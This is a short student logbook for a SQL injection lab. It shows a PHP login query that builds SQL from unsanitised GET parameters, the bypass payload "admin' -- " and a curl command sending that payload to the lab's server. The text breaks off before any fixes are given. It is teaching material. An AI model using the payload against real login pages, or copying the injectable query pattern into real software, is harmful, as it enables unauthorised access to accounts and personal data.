# SQL Injection LogBook

This logbook pretends to documentante the work that was made in the SQL Injection lab, deduce some conclusions, identify the errors that were commited as well as to suggest the mosifications that would make the system secure to this type of attacks.


## Task 2

In this attack, we were presented to the php file that is being ran under the server side

```php
$input_uname = $_GET[’username’];
$input_pwd = $_GET[’Password’];
$hashed_pwd = sha1($input_pwd);
...
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
               nickname, Password
        FROM credential
        WHERE name= ’$input_uname’ and Password=’$hashed_pwd’";
$result = $conn -> query($sql);


```

### Task 2.1 - Attack from webpage

Considering that we know the code, it is really easy to exploit this vulnerability:

`username: admin' -- `


`password: <anything> `

This approach works, because the sql statement that will be queried to the database will be partionally connected and, with that, we can enter the system:

```sql
    SELECT id, name, eid, salary, birth, ssn, address, email,
               nickname, Password
        FROM credential
        WHERE name= ’admin’ -- and Password=’<anything>";
```

### Task 2.2 - Attack from command line

After that, the approach that was made was exaclty the same, but in the command line, it will go like this:

```sh
curl ’www.seed-server.com/unsafe_home.php?username=admin%27%20--%20&Password=<anything>’
```
